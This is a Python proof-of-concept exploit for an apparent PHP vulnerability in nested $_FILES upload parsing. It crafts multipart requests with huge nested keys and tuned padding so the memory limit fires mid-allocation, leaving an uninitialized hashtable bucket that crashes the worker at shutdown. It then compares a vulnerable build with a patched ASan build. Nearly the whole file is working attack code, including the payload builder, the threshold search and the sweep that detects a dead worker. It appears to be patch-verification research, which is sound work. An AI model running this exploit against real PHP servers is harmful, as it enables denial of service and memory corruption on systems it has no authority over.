#!/usr/bin/env python3
# INDEX: use of counted-but-uninitialized $_files hashtable bucket | cli | oom at nested-key alloc
"""files_key_stale_bucket.py - CVE-2026-109618 differential (cli-asan pair).

A nested $_FILES upload (u[<index>][k]) makes php_register_variable_ex create
intermediate HashTable levels; each level's key goes through
_zend_hash_str_add_or_update_i, which does `idx = ht->nNumUsed++` (bucket claimed
and counted) BEFORE the fallible `zend_string_init` of the key. If memory_limit
fires exactly at that key allocation, a vulnerable build bails with the bucket
counted but uninitialized; request shutdown's zend_array_destroy then releases
the garbage key -> use of uninitialized (ASan 0xBE-filled) memory -> worker dies.
A patched build completes the allocation (delayed soft OOM) and answers 500 with
the worker alive.

Part 1 (u[aaaa...][k]) seats a valid heap key in each per-entry table (so it is
not STATIC_KEYS_ONLY when part 2 lands); part 2 (u[bbbb...][k]) supplies the
deadly intermediate key allocations. Retained $_POST padding fields shift where
memory_limit fires; the sweep walks the crossing onto one of part 2's keys.
Needs a vulnerable and a fixed target (the cli-asan pair).

Usage:
    python3 -I poc/bugs/files_key_stale_bucket.py <vuln_url> <fixed_url>
    python3 -I poc/bugs/files_key_stale_bucket.py --pad N <vuln_url> <fixed_url>
"""
from __future__ import annotations

import argparse
import os
import sys
import time

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.http_urllib import http, worker_alive  # noqa: E402
from common.multipart import part_tuple as part, multipart_default as multipart  # noqa: E402

IDX_LEN = 262144   # nested index length (bytes) per file part
PAD_FIELD = 16384  # retained bytes per padding form field


def build_parts(n_pad, idx_len=IDX_LEN):
    parts = [part(f"p{i}", b"P" * PAD_FIELD) for i in range(n_pad)]
    parts.append(part("u[" + "a" * idx_len + "][k]", b"x",
                      filename="f.txt", ctype="text/plain"))
    parts.append(part("u[" + "b" * idx_len + "][k]", b"y",
                      filename="g.txt", ctype="text/plain"))
    return parts


def fire(base, n_pad, idx_len=IDX_LEN, timeout=300):
    body, headers = multipart(build_parts(n_pad, idx_len))
    return http(base + "/poc.php", data=body, headers=headers, timeout=timeout)


def run(args):
    vuln = args.vuln.rstrip("/")
    fixed = args.fixed.rstrip("/")
    t0 = time.time()

    if args.pad is not None:
        # Single-shot mode (replay a pad found by the sweep, e.g. after a
        # container restart).
        single_shot(vuln, fixed, args.pad, args.idx_len)
        return

    print("[files_key_stale_bucket] CVE-2026-109618: OOM at the key zend_string_init() inside")
    print("[files_key_stale_bucket] _zend_hash_str_add_or_update_i, after nNumUsed++ claimed the")
    print("[files_key_stale_bucket] bucket. Vulnerable: uninitialized bucket -> zend_array_destroy")
    print("[files_key_stale_bucket] at request shutdown. Patched: delayed soft OOM, clean 500.")

    # Phase 1: locate the OOM threshold on the fixed build (its worker never
    # dies, whatever the crossing point).
    print(f"[files_key_stale_bucket] phase 1 (fixed {fixed}): locating the memory_limit threshold")
    n = 256
    while True:
        s, b = fire(fixed, n, args.idx_len)
        print(f"[files_key_stale_bucket]   {n} padding fields ({n * PAD_FIELD // 1024} KiB):"
              f" HTTP {s}")
        if s != 200 or n >= 1536:
            break
        n *= 2
    if s == 200:
        print("[files_key_stale_bucket] could not reach memory_limit; raise --idx-len")
        return
    lo, hi = 0, n
    while lo + 1 < hi:
        mid = (lo + hi) // 2
        s, b = fire(fixed, mid, args.idx_len)
        print(f"[files_key_stale_bucket]   {mid}: HTTP {s}")
        if s == 200:
            lo = mid
        else:
            hi = mid
    n500 = hi
    print(f"[files_key_stale_bucket] threshold: {n500} padding fields "
          f"({n500} x {PAD_FIELD // 1024} KiB + the two upload parts "
          f"cross memory_limit; {lo} fields stay under)")

    # Phase 2: sweep upward on the vulnerable build. Bigger pad -> the OOM
    # crossing moves earlier; just above the threshold it walks back through
    # part 2's allocation sequence. Landings outside the six key allocations
    # (header copies, array_index, the interned leaf keys, part 1, the pad
    # fields themselves, the script) are non-deadly on the vulnerable build;
    # landings on a key allocation kill the worker at request shutdown.
    print(f"[files_key_stale_bucket] phase 2 (vuln {vuln}): sweeping the crossing through part 2")
    hit = None
    n = n500
    while n <= n500 + args.span:
        s, b = fire(vuln, n, args.idx_len)
        alive = worker_alive(vuln)
        print(f"[files_key_stale_bucket]   {n}: HTTP {s}, worker {'alive' if alive else 'DEAD'}")
        if not alive:
            hit = n
            break
        if s == 200:
            print("[files_key_stale_bucket] unexpected 200 above the threshold; stopping")
            break
        n += args.step
    if hit is None:
        print(f"[files_key_stale_bucket] no deadly landing within {args.span} fields of the "
              f"threshold; rerun with a larger --span or --step 4")
        return

    # Phase 3: the same request on the fixed build must be survivable.
    print(f"[files_key_stale_bucket] hit at {hit} padding fields. Verifying on the fixed build:")
    s, b = fire(fixed, hit, args.idx_len)
    alive = worker_alive(fixed)
    print(f"[files_key_stale_bucket]   fixed: HTTP {s}, worker {'alive' if alive else 'DEAD'}")
    print(f"[files_key_stale_bucket] elapsed {time.time() - t0:.1f}s")
    print(f"[files_key_stale_bucket] VULNERABLE: cli-asan worker died processing the request whose")
    print(f"[files_key_stale_bucket] OOM landed at the key allocation (nNumUsed++ claimed). Check:")
    print(f"[files_key_stale_bucket]   docker compose logs cli-asan | grep -B2 -A25 'SEGV\\|ERROR'")
    print(f"[files_key_stale_bucket]   (AddressSanitizer report in zend_string_release <-")
    print(f"[files_key_stale_bucket]    zend_array_destroy <- php_request_shutdown)")
    if s == 500 and alive:
        print(f"[files_key_stale_bucket] PATCHED: cli-asan-fixed answered HTTP 500 (delayed soft")
        print(f"[files_key_stale_bucket] OOM reported cleanly at a safe point) and the worker is")
        print(f"[files_key_stale_bucket] alive - no ASan report.")
    else:
        print(f"[files_key_stale_bucket] unexpected fixed-build result; check logs.")
    print(f"[files_key_stale_bucket] replay single shots after `docker compose restart cli-asan`:")
    print(f"[files_key_stale_bucket]   python3 -I poc/bugs/files_key_stale_bucket.py --pad {hit} "
          f"<vuln> <fixed>")


def single_shot(vuln, fixed, n, idx_len=IDX_LEN):
    for label, base in (("vuln", vuln), ("fixed", fixed)):
        s, b = fire(base, n, idx_len)
        alive = worker_alive(base)
        print(f"[files_key_stale_bucket] {label}: HTTP {s}, worker {'alive' if alive else 'DEAD'}")
        if not alive:
            print(f"[files_key_stale_bucket] {label} died - check `docker compose logs` for the "
                  f"AddressSanitizer report (zend_array_destroy teardown)")


def main():
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("vuln")
    ap.add_argument("fixed")
    ap.add_argument("--pad", type=int, default=None,
                    help="skip the sweep; fire a single request with this many "
                         "padding fields")
    ap.add_argument("--idx-len", type=int, default=IDX_LEN)
    ap.add_argument("--step", type=int, default=8,
                    help="padding fields per sweep step (default 8)")
    ap.add_argument("--span", type=int, default=336,
                    help="sweep this many fields past the threshold (default 336)")
    run(ap.parse_args())


if __name__ == "__main__":
    main()
